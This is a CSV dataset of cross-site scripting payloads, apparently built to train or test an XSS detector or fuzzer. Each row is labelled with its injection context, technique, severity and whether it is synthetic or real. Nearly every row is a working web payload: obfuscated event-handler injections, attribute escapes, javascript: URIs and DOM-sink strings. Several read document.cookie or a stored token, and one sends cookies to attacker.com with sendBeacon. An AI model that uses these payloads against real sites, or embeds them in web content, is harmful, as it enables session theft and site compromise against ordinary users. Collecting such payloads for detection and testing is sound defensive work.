payload,context,technique,severity,length,source
"%27><img src=x onanimationcancel=console.log(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,76,synthetic
<liStiNg	OnkEyuP=aLerT(lOcaTioN.hAsh)>,tag_injection,synthetic,medium,38,synthetic
&quOt; onCliCk=ProMpt('XSS') x=&qUot;,attribute_escape,synthetic,medium,37,synthetic
onw&#97;iting=consol&#101;.log&#40;loc&#97;tion.h&#97;sh&#41;,event_handler,synthetic,low,61,synthetic
"%3Cmarquee/onclose=confirm(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,60,synthetic
<noscript ongesturestart=alert(%27XSS%27)>,tag_injection,synthetic,medium,42,synthetic
%27><img src=x onpopstate=alert(1)>,attribute_escape,synthetic,medium,35,synthetic
`><img src=x oncopy=prompt(document.domain)>,attribute_escape,synthetic,medium,44,synthetic
"'><img src=x onmous&#101;&#101;nt&#101;r=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,medium,89,synthetic
ontransitionend=alert/**/(location.hash),event_handler,synthetic,low,40,synthetic
"%3C!--%3E%3Cbody onfocusout=prompt(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,68,synthetic
"\"" ondr&#97;gov&#101;r=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape,synthetic,low,81,synthetic
"location=""javascript:prompt(document.cookie+'&loc='+location.href)""",dom_sink,synthetic,high,67,synthetic
"<div draggable=""true"" contenteditable>drag me</div><rb ondragover=alert(1) contenteditable style=display:block>drop here</rb>",tag_injection,none,medium,125,real
""" onmouseover=console.log(document.domain) x=""",attribute_escape,synthetic,medium,46,synthetic
""" ><svG oNtoGglE=cOnsOle.loG(1)>",attribute_escape,synthetic,medium,32,synthetic
"<html onmouseup=""alert(1)"">AnonKryptiQuz</html>",tag_injection,none,medium,47,real
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""confirm(bto&#97;(docum&#101;nt.cooki&#101;))""",dom_sink,synthetic,medium,113,synthetic
<button popovertarget=x>Click me</button><form onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</form>,tag_injection,none,medium,104,real
' oNgeStuReeNd=ConSolE.lOg('XSS') ',attribute_escape,synthetic,medium,35,synthetic
"<video ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</video>",tag_injection,none,medium,91,real
<dialog onstalled=confirm(%27XSS%27)>,tag_injection,synthetic,medium,37,synthetic
%27 ><svg onmousewheel=prompt(%27XSS%27)>,attribute_escape,synthetic,medium,41,synthetic
"\' onanimationcancel=console.log(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,65,synthetic
""" ><svg onscrollsnapchange=alert('XSS')>",attribute_escape,synthetic,medium,40,synthetic
`><img src=x ongesturestart=\u0061lert(1)>,attribute_escape,synthetic,low,42,synthetic
"<style>:target {transform: rotate(180deg);}</style><option id=x style=""transition:transform 2s"" ontransitionrun=print()></option>",tag_injection,none,low,129,real
<element id=x tabindex=1 onfocusin=alert(1)></element>,tag_injection,none,medium,54,real
"__pRotO__[""oNpoIntErcAncEl""]=eVal(loCatIon.haSh)",dom_sink,synthetic,low,48,synthetic
"<dfn oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,96,real
"<noscript
ongesturestart=\u0061lert('XSS')>",tag_injection,synthetic,low,43,synthetic
"<td draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</td>",tag_injection,none,medium,80,real
"<viDeo
onDraGstArt=alErt('XSS')>",tag_injection,synthetic,medium,32,synthetic
<!--[if<img src=x onerror=javascript:alert(1)//]> -->,js_uri,comment_injection,medium,53,real
""" oNinValId=ProMpt(StRinG.fRomChaRCoDe(88,83,83)) """,attribute_escape,synthetic,high,51,synthetic
<maRquEe X=y onAuxCliCk=ConFirM(lOcaTioN.hAsh)>,tag_injection,synthetic,medium,47,synthetic
"<obJecT
oNmoZfuLlsCreEncHanGe=ConSolE.lOg(1)>",tag_injection,synthetic,medium,45,synthetic
%3Ctd onend=console.log(document.domain)/%3E,tag_injection,synthetic,medium,44,synthetic
<button src=x onclick=console.log(1)>,tag_injection,synthetic,medium,37,synthetic
\' OndRagEntEr=ProMpt(doCumEnt.doMaiN)//,attribute_escape,synthetic,medium,40,synthetic
%3Cselect ongotpointercapture=confirm(document.domain) ongotpointercapture=confirm(document.domain)%3E,tag_injection,synthetic,medium,102,synthetic
"""><img src=x onsearch=confirm(1)>",attribute_escape,synthetic,medium,33,synthetic
' oNtoUchMovE=cOnsOle.loG(dOcuMenT.dOmaIn) ',attribute_escape,synthetic,medium,44,synthetic
"<style>:target {color:red;}</style><hr id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></hr>",tag_injection,none,medium,108,real
<tiTle onMozFulLscReeNchAngE=pRomPt('XSS')>,tag_injection,synthetic,medium,43,synthetic
""" oninput=\u0061lert(1) """,attribute_escape,synthetic,low,25,synthetic
'><Img srC=x onErrOr=ConSolE.lOg(DocUmeNt.DomAin)>,attribute_escape,synthetic,medium,50,synthetic
onmozfullscr&#101;&#101;nch&#97;ng&#101;=prompt&#40;'XSS'&#41;,event_handler,synthetic,low,62,synthetic
"	onPoiNteRcaNceL=aLerT(STriNg.FroMChArCOde(88,83,83))",event_handler,synthetic,high,53,synthetic
"<style>:target {transform: rotate(180deg);}</style><small id=x style=""transition:transform 2s"" ontransitionrun=print()></small>",tag_injection,none,low,127,real
"<style>:target {transform: rotate(180deg);}</style><code id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></code>",tag_injection,none,medium,126,real
<body onscroll=javascript:alert(6640)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>,js_uri,none,medium,270,real
OnmOzfUllScrEenChaNge=prOmpT&#40;LocAtiOn.HasH&#41;,event_handler,synthetic,low,51,synthetic
<center id=x tabindex=1 onbeforedeactivate=alert(1)></center><input autofocus>,tag_injection,none,medium,78,real
"eval(""prompt(String.fromCharCode(88,83,83))"")",dom_sink,synthetic,high,45,synthetic
"""%3E%3Cimg src=x onpaste=console.log(document.domain)%3E",attribute_escape,synthetic,medium,56,synthetic
`><img src=x onmousedown=console.log(%27XSS%27)>,attribute_escape,synthetic,medium,48,synthetic
"""%3E%3Cimg src=x onpointerover=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,76,synthetic
<liStiNg OnwEbkItaNimAtiOneNd=ConSolE.lOg('XSS')/>,tag_injection,synthetic,medium,50,synthetic
"""%3E%3Cimg src=x onclose=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,70,synthetic
<object onwebkitanimationend=alert(location.hash)>,tag_injection,synthetic,medium,50,synthetic
<script>Function(%27prompt(document.domain)%27)();</script>,script_injection,synthetic,medium,59,synthetic
"<marquee onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</marquee>",tag_injection,none,medium,74,real
"<noembed onclick=""alert(1)"" style=display:block>AnonKryptiQuz</noembed>",tag_injection,none,medium,71,real
"""><form onw&#101;bkittr&#97;nsition&#101;nd=prompt(loc&#97;tion.h&#97;sh)>",tag_injection,synthetic,medium,74,synthetic
"\"" onbeforetoggle=alert(location.hash)//",attribute_escape,synthetic,medium,40,synthetic
"<style>:target {color:red;}</style><b id=x style=""transition:color 1s"" ontransitionstart=alert(1)></b>",tag_injection,none,medium,102,real
<IMG SRC=&{javascript:alert(1);};>,js_uri,case_variation,medium,34,real
&#x03c;,generic,html_entity,low,7,real
"' ><svg ongotpointercapture=prompt(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,66,synthetic
'><img src=x onbeforepaste=\u0061lert(1)>,attribute_escape,synthetic,low,41,synthetic
<!--><noscript onpaste=confirm(location.hash)>,tag_injection,synthetic,medium,46,synthetic
%3Cbody src=x onclose=console.log('XSS')%3E,tag_injection,synthetic,medium,43,synthetic
"<dl onmouseup=""alert(1)"">AnonKryptiQuz</dl>",tag_injection,none,medium,43,real
"<div draggable=""true"" contenteditable>drag me</div><mark ondrop=alert(1) contenteditable>drop here</mark>",tag_injection,none,medium,105,real
""" oncopy=consol&#101;.log(1) """,attribute_escape,synthetic,low,30,synthetic
<frameset id=x tabindex=1 onfocus=alert(1)></frameset>,tag_injection,none,medium,54,real
""" ><svg onerror=confirm(location.hash)>",attribute_escape,synthetic,medium,39,synthetic
""" ><svG oNanImaTioNcaNceL=cOnfIrm(loCatIon.haSh)>",attribute_escape,synthetic,medium,49,synthetic
<dir onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,54,real
<article onpointerleave=alert(1) style=display:block>AnonKryptiQuz</article>,tag_injection,none,medium,76,real
"""%3E%3Cimg src=x onmouseover=prompt(document.domain)%3E",attribute_escape,synthetic,medium,55,synthetic
"<div draggable=""true"" contenteditable>drag me</div><tbody ondrop=alert(1) contenteditable style=display:block>drop here</tbody>",tag_injection,none,medium,127,real
<baSe/OniNvaLid=coNfiRm(LocAtiOn.HasH)>,tag_injection,synthetic,medium,39,synthetic
&quot; oncut=confirm('XSS') x=&quot;,attribute_escape,synthetic,medium,36,synthetic
""" %3E%3Csvg ontoggle=alert(document.domain)%3E",attribute_escape,synthetic,medium,46,synthetic
<BODY ONLOAD=alert('hellox worldss')>,tag_injection,case_variation,medium,37,real
<sub onpointerleave=alert(1) style=display:block>AnonKryptiQuz</sub>,tag_injection,none,medium,68,real
OnmOzfUllScrEenChaNge=jaVasCriPt:ProMpt('XSS'),event_handler,synthetic,medium,46,synthetic
"'><Img srC=x onPoiNteRup=coNfiRm(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape,synthetic,high,64,synthetic
"<td onclick=""alert(1)"" style=display:block>AnonKryptiQuz</td>",tag_injection,none,medium,61,real
' ><svg onpoint&#101;rdown=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,low,68,synthetic
"<shadow onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</shadow>",tag_injection,none,medium,65,real
' oNseCurItyPolIcyVioLatIon=coNsoLe.Log('XSS') ',attribute_escape,synthetic,medium,48,synthetic
"&lt;BODY BACKGROUND=\""javascript&#058;alert('XSS')\""&gt;",generic,html_entity,medium,56,real
"document.write(""<img src=x onerror=alert(localStorage.getItem('token'))>"")",dom_sink,synthetic,high,74,synthetic
"\"" OndBlcLicK=cOnsOle.loG(lOcaTioN.hAsh)//",attribute_escape,synthetic,medium,42,synthetic
"<image src=1 href=1 onerror=""javascript:alert(3089)""></image>",js_uri,none,medium,61,real
"<style>@keyframes x{}</style><nextid style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></nextid>",tag_injection,none,medium,105,real
%3Carea/onload=console.log(document.domain)%3E,tag_injection,synthetic,medium,46,synthetic
"__proto__[""onmous&#101;down""]=&#97;l&#101;rt(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)",dom_sink,synthetic,low,102,synthetic
<multicol onpointermove=alert(1) style=display:block>AnonKryptiQuz</multicol>,tag_injection,none,medium,77,real
"""><img src=x onblur=\u0061lert(location.hash)>",attribute_escape,synthetic,low,46,synthetic
<Img Src=On OnError=alert(1)>,tag_injection,case_variation,medium,29,real
 onanimationcancel=prompt(location.hash),event_handler,synthetic,medium,40,synthetic
<a onpointerleave=alert(1) style=display:block>AnonKryptiQuz</a>,tag_injection,none,medium,64,real
<noscript onbeforematch=console.log('XSS') onbeforematch=console.log('XSS')>,tag_injection,synthetic,medium,76,synthetic
<bdo id=x tabindex=1 onbeforedeactivate=alert(1)></bdo><input autofocus>,tag_injection,none,medium,72,real
"\"" on&#97;nim&#97;tion&#101;nd=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape,synthetic,low,87,synthetic
""" ontouchmov&#101;=confirm(docum&#101;nt.dom&#97;in) """,attribute_escape,synthetic,medium,54,synthetic
"<style>:target {color: red;}</style><thead id=x style=""transition:color 10s"" ontransitioncancel=print()></thead>",tag_injection,none,low,112,real
 onmous&#101;ov&#101;r=confirm(1),event_handler,synthetic,medium,33,synthetic
{text:<img/src=x onload=confirm(1)>},tag_injection,none,medium,36,real
<animatemotion onsecuritypolicyviolation=console.log(%27XSS%27)>,tag_injection,synthetic,medium,64,synthetic
"<t&#101;mpl&#97;t&#101;
ons&#101;&#97;rch=consol&#101;.log(docum&#101;nt.dom&#97;in)>",tag_injection,synthetic,low,85,synthetic
#{confirm(%27XSS%27)},template_injection,synthetic,medium,21,synthetic
"'><img src=x onerror=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,58,synthetic
javascript:%61lert(1),js_uri,url_encoding,low,21,real
%22><img src=x ongestureend=confirm(%27XSS%27)>,attribute_escape,synthetic,medium,47,synthetic
""" %3E%3Csvg ondragstart=confirm(1)%3E",attribute_escape,synthetic,medium,37,synthetic
' onb&#101;for&#101;p&#97;st&#101;=confirm(docum&#101;nt.dom&#97;in) ',attribute_escape,synthetic,medium,70,synthetic
	onbeforematch=prompt(%27XSS%27),event_handler,synthetic,medium,32,synthetic
%22><img src=x onclick=confirm(%27XSS%27)>,attribute_escape,synthetic,medium,42,synthetic
<figure onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</figure>,tag_injection,none,medium,78,real
%3Cset/onwebkitfullscreenchange=console.log('XSS')%3E,tag_injection,synthetic,medium,53,synthetic
%27><img src=x ongesturestart=prompt(%27XSS%27)>,attribute_escape,synthetic,medium,48,synthetic
<!--><m&#97;rqu&#101;&#101; on&#97;uxclick=prompt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,73,synthetic
"<colgroup oncontextmenu=""alert(1)"">AnonKryptiQuz</colgroup>",tag_injection,none,medium,59,real
<time onpointerleave=alert(1) style=display:block>AnonKryptiQuz</time>,tag_injection,none,medium,70,real
"location=""javascr	ipt:confirm(navigator.sendBeacon('//attacker.com',document.cookie))""",dom_sink,synthetic,high,86,synthetic
'><img src=x ondr&#97;g&#101;nt&#101;r=consol&#101;.log(1)>,attribute_escape,synthetic,low,59,synthetic
\' onpoint&#101;rr&#97;wupd&#97;t&#101;=&#97;l&#101;rt('XSS')//,attribute_escape,synthetic,low,63,synthetic
"<bdi onclick=""alert(1)"">AnonKryptiQuz</bdi>",tag_injection,none,medium,43,real
"<a href=""\xC2\xA0javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,75,real
__proto__[%22onbeforecopy%22]=prompt(location.hash),dom_sink,synthetic,medium,51,synthetic
location=%22javascript:eval(document.cookie)%22,dom_sink,synthetic,high,47,synthetic
"<div draggable=""true"" contenteditable>drag me</div><xmp ondrop=alert(1) contenteditable style=display:block>drop here</xmp>",tag_injection,none,medium,123,real
<q onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,52,real
	onkeydown=confirm('XSS'),event_handler,synthetic,medium,25,synthetic
%27 oncanplay=console.log(location.hash) %27,attribute_escape,synthetic,medium,44,synthetic
<a OnkEypResS=cOnfIrm(1)/>,tag_injection,synthetic,medium,26,synthetic
`><img src=x ondblclick=console.log('XSS')>,attribute_escape,synthetic,medium,43,synthetic
"<math
onpromptaction=prompt(1)>",tag_injection,synthetic,medium,31,synthetic
<audio onpopstate=confirm(location.hash)/>,tag_injection,synthetic,medium,42,synthetic
"<ruby onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</ruby>",tag_injection,none,medium,67,real
OnpAstE=aLerT&#40;1&#41;,event_handler,synthetic,low,24,synthetic
<table src=x oninvalid=prompt('XSS')>,tag_injection,synthetic,medium,37,synthetic
"&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\""javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;alert('AnonKryptiQuz');\""&gt;&#93;&#93;&gt;",generic,html_entity,medium,160,real
OnpAgeShoW=aLerT&#40;'XSS'&#41;,event_handler,synthetic,low,31,synthetic
' oNpoIntErmOve=prOmpT(lOcaTioN.hAsh) ',attribute_escape,synthetic,medium,39,synthetic
""" ><svg onscrollsnapchange=prompt(location.hash)>",attribute_escape,synthetic,medium,49,synthetic
"<div id=""118""><div draggable=""true"" ondragstart=""event.dataTransfer.setData('text/plain','malicious code');""><h1>Drop me</h1></div>",tag_injection,none,low,131,real
OnsUbmIt=ConFirM(dOcuMenT.dOmaIn),event_handler,synthetic,medium,33,synthetic
"<u onmouseout=""alert(1)"">AnonKryptiQuz</u>",tag_injection,none,medium,42,real
%27 ><svg ontouchmove=prompt(%27XSS%27)>,attribute_escape,synthetic,medium,40,synthetic
"(new Function(""eval(location.hash)""))();",dom_sink,synthetic,high,40,synthetic
"""><body oninvalid=alert(location.hash)>",tag_injection,synthetic,medium,39,synthetic
`%3E%3Cimg src=x onpromptaction=prompt(1)%3E,attribute_escape,synthetic,medium,44,synthetic
"onp&#97;g&#101;show=prompt/*x*/(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,low,71,synthetic
' ><svg oncut=confirm(1)>,attribute_escape,synthetic,medium,25,synthetic
<animatetransform src=x onpointermove=console.log('XSS')>,tag_injection,synthetic,medium,57,synthetic
"<div draggable=""true"" contenteditable>drag me</div><canvas ondrop=alert(1) contenteditable style=display:block>drop here</canvas>",tag_injection,none,medium,129,real
""" %3E%3Csvg onwebkitfullscreenchange=console.log(document.domain)%3E",attribute_escape,synthetic,medium,68,synthetic
' %3E%3Csvg ontoggle=console.log(1)%3E,attribute_escape,synthetic,medium,38,synthetic
"\"" on&#97;uxclick=confirm(loc&#97;tion.h&#97;sh)//",attribute_escape,synthetic,medium,50,synthetic
"<button onmouseenter=""alert(1)"">AnonKryptiQuz</button>",tag_injection,none,medium,54,real
' ontouchmov&#101;=confirm(docum&#101;nt.dom&#97;in) ',attribute_escape,synthetic,medium,54,synthetic
onscrollsnapchange=javascr	ipt:console.log(location.hash),event_handler,synthetic,medium,57,synthetic
<scRipT>//coNsoLe.Log(loCatIon.haSh)</sCriPt>,script_injection,synthetic,medium,45,synthetic
%3Cselect/onvolumechange=console.log(1)%3E,tag_injection,synthetic,medium,42,synthetic
on&#101;rror=j&#97;v&#97;script:consol&#101;.log(loc&#97;tion.h&#97;sh),event_handler,synthetic,low,71,synthetic
""" ><svG oNtoGglE=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape,synthetic,high,56,synthetic
"<iframe src iframe src=""javascript:javascript:alert(4353)""></iframe src>",js_uri,none,medium,72,real
"""><img src=x ong&#101;stur&#101;st&#97;rt=&#97;l&#101;rt(1)>",attribute_escape,synthetic,low,60,synthetic
"<xmp/onmousewheel=prompt(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,56,synthetic
<noscr	ipt src=x ongesturestart=alert('XSS')>,tag_injection,synthetic,medium,45,synthetic
"<img src=""javascript:document.vulnerable=true;"">",dom_sink,none,low,48,real
\' onhashchange=prompt('XSS')//,attribute_escape,synthetic,medium,31,synthetic
' ><svG oNhaShcHanGe=AleRt('XSS')>,attribute_escape,synthetic,medium,34,synthetic
"\"" OncOpy=prOmpT(dOcuMenT.dOmaIn)//",attribute_escape,synthetic,medium,35,synthetic
&quot; ongestureend=console.log('XSS') x=&quot;,attribute_escape,synthetic,medium,47,synthetic
